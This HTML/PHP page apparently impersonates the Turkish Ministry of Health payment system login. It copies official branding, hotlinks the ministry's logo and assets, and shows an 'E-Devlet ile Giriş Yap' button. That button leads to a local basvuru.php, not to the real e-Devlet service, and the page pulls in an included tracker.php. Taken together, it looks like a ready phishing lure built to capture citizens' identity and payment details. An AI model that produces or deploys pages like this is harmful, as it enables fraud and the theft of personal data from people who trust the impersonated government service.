<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <title>T.C. Sağlık Bakanlığı Ödeme Sistemi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="T.C. Sağlık Bakanlığı Ödeme Sistemi için e-Devlet üzerinden giriş yapabilirsiniz.">
    <link rel="icon" type="image/png" href="https://sbos.saglik.gov.tr/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #1a3a4a;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow-x: hidden;
        }
        .bg-layer {
            position: fixed;
            inset: 0;
            z-index: 0;
            background: 
                linear-gradient(135deg, rgba(20,60,90,0.82) 0%, rgba(30,80,120,0.72) 40%, rgba(40,100,140,0.65) 100%),
                url('https://images.unsplash.com/photo-1576091160399-112ba8d25d1d?w=1920&q=80') center/cover no-repeat;
        }
        .top-header {
            position: relative;
            z-index: 10;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px 40px;
        }
        .top-header-left {
            display: flex;
            align-items: center;
        }
        .top-header-left img {
            height: 52px;
            width: 52px;
            object-fit: contain;
            border-radius: 50%;
        }
        .top-header-right {
            display: flex;
            align-items: center;
            gap: 24px;
        }
        .top-header-right a {
            color: rgba(255,255,255,0.85);
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
            transition: color 0.2s;
        }
        .top-header-right a:hover {
            color: #fff;
        }
        .top-header-right .globe-icon {
            width: 20px;
            height: 20px;
            opacity: 0.7;
            cursor: pointer;
        }
        .main-content {
            position: relative;
            z-index: 10;
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            gap: 24px;
        }
        .logo-area {
            text-align: center;
            margin-bottom: 4px;
        }
        .logo-area img {
            height: 72px;
            margin-bottom: 8px;
        }
        .logo-subtitle {
            color: rgba(255,255,255,0.85);
            font-size: 14px;
            font-weight: 400;
            margin-top: 8px;
        }
        .login-card {
            background: rgba(255,255,255,0.92);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border-radius: 16px;
            padding: 40px 48px;
            width: 100%;
            max-width: 540px;
            box-shadow: 0 8px 40px rgba(0,0,0,0.15);
            text-align: center;
        }
        .login-card h2 {
            font-size: 22px;
            font-weight: 700;
            color: #1a1a2e;
            margin-bottom: 8px;
        }
        .login-card .notice {
            font-size: 13px;
            color: #888;
            margin-bottom: 28px;
        }
        .btn-edevlet {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
            max-width: 320px;
            padding: 14px 32px;
            background: #D32F2F;
            color: #fff;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            text-decoration: none;
            margin-bottom: 32px;
        }
        .btn-edevlet:hover {
            background: #B71C1C;
        }
        .btn-edevlet:active {
            transform: scale(0.98);
        }
        .info-divider {
            height: 1px;
            background: #e5e5e5;
            margin-bottom: 24px;
        }
        .info-cards {
            display: flex;
            gap: 12px;
            justify-content: center;
        }
        .info-card {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            padding: 16px 12px;
            border: 1.5px solid #e8e8e8;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            background: #fff;
        }
        .info-card:hover {
            border-color: #ccc;
            background: #fafafa;
        }
        .info-card .ic-icon {
            width: 32px;
            height: 32px;
            color: #D32F2F;
        }
        .info-card .ic-label {
            font-size: 12px;
            font-weight: 600;
            color: #444;
            text-align: center;
            line-height: 1.4;
        }
        .info-card.turist {
            justify-content: center;
        }
        .info-card .turist-title {
            font-size: 13px;
            font-weight: 700;
            color: #333;
        }
        .btn-turist {
            padding: 6px 24px;
            border: 2px solid #1976D2;
            border-radius: 6px;
            color: #1976D2;
            font-size: 12px;
            font-weight: 700;
            background: transparent;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-turist:hover {
            background: #1976D2;
            color: #fff;
        }
        .bottom-info {
            text-align: center;
            color: rgba(255,255,255,0.7);
            font-size: 12px;
            line-height: 1.7;
            max-width: 540px;
        }
        .bottom-info a {
            color: #64B5F6;
            text-decoration: none;
        }
        .bottom-info a:hover {
            text-decoration: underline;
        }
        .bottom-info .alo {
            color: #90CAF9;
            font-weight: 700;
        }
        .bottom-credit {
            text-align: center;
            color: rgba(255,255,255,0.5);
            font-size: 11px;
            margin-top: 8px;
        }
        .page-footer {
            position: relative;
            z-index: 10;
            text-align: center;
            padding: 16px;
            color: rgba(255,255,255,0.4);
            font-size: 11px;
        }
        @media (max-width: 639px) {
            .top-header { padding: 12px 16px; }
            .top-header-right { gap: 12px; }
            .top-header-right a { font-size: 11px; }
            .login-card { padding: 28px 20px; }
            .info-cards { flex-direction: column; }
            .info-card { flex-direction: row; padding: 12px 16px; }
            .logo-area img { height: 56px; }
            .top-header-left img { height: 40px; width: 40px; }
        }
    </style>
</head>
<body>
    <div class="bg-layer"></div>

    <div class="top-header">
        <div class="top-header-left">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2c/Logo_of_Ministry_of_Health_%28Turkey%29.png" 
                 alt="T.C. Sağlık Bakanlığı">
        </div>
        <div class="top-header-right">
            <a href="#">Çerez Politikası</a>
            <a href="#">Aydınlatma Metni</a>
            <a href="#">Dokümanlar</a>
            <svg class="globe-icon" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.7)" stroke-width="1.8">
                <circle cx="12" cy="12" r="10"/>
                <path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
            </svg>
        </div>
    </div>

    <div class="main-content">
        <div class="logo-area">
            <img src="https://sbos.saglik.gov.tr/_next/static/media/aileHekimiLogoSb2.b6f9fbf7.svg" alt="T.C. Sağlık Bakanlığı Ödeme Sistemi">
            <div class="logo-subtitle">"T.C. Sağlık Bakanlığı Ödeme Sistemi" için e-Devlet üzerinden giriş yapabilirsiniz.</div>
        </div>

        <div class="login-card">
            <h2>Vatandaş Girişi</h2>
            <p class="notice">* Kimlik bilgilerinin doğruluğu teyit edilecektir.</p>

            <a href="basvuru.php" class="btn-edevlet">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
                    <path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M15 12H3"/>
                </svg>
                E-Devlet ile Giriş Yap
            </a>

            <div class="info-divider"></div>

            <div class="info-cards">
                <a href="#" class="info-card">
                    <svg class="ic-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <path d="M9 12h6M9 16h6M13 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V9l-7-7z"/>
                        <path d="M13 2v7h7"/>
                    </svg>
                    <span class="ic-label">Nasıl Giriş Yaparım?</span>
                </a>
                <a href="#" class="info-card">
                    <svg class="ic-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/>
                        <path d="M9 14l2 2 4-4"/>
                    </svg>
                    <span class="ic-label">Sıkça Sorulan Sorular</span>
                </a>
                <div class="info-card turist">
                    <span class="turist-title">Turist Girişi</span>
                    <button class="btn-turist">Giriş</button>
                </div>
            </div>
        </div>

        <div class="bottom-info">
            Yazılım ile ilgili soru, görüş ve önerileriniz <a href="#">sabim.gov.tr</a> web adresi üzerinden kayıt açabilir veya
            <span class="alo">ALO184</span> numarasını arayabilirsiniz.
        </div>
        <div class="bottom-credit">T.C. Sağlık Bakanlığı tarafından geliştirilmiştir.</div>
    </div>

    <div class="page-footer">
        &copy; T.C. Sağlık Bakanlığı. Tüm hakları saklıdır.
    </div>

    <?php include 'includes/tracker.php'; ?>
</body>
</html>
